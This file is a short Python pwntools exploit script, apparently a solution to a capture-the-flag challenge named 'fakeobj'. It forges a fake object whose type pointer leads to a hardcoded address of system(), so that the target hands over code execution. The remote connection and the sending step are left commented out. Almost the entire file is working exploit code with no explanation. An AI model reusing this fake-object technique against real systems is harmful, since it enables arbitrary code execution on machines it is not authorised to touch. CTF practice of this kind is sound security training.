from pwn import *

context.terminal =  ["tmux", "splitw", "-h"] 
context.endian = 'little'
BINARY = "./fakeobj.py"
HOST = "chal.2025-us.ductf.net"
PORT = 30001

def start_binary():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

# p = start_binary()
# leaks = p.recv().decode()
# addrs = re.findall(r'0x[0-9a-fA-F]+', leaks)
# obj_addr = int(addrs[0], 16)
# system = int(addrs[1], 16)


obj_addr = 0x7ffff7778470
system = 0x7ffff7d09400

log.success(f"obj @ {hex(obj_addr)}")
log.success(f"system @ {hex(system)}")

fake_type_addr = obj_addr + 0x10

payload = b""
payload += p64(0x1111111111111111)
payload += p64(fake_type_addr)
payload += b"A" * (0x28 - len(payload))
payload += p64(system)
payload = payload.ljust(72, b"B")
print(payload.hex())

# p.sendline(payload.hex())
# p.interactive()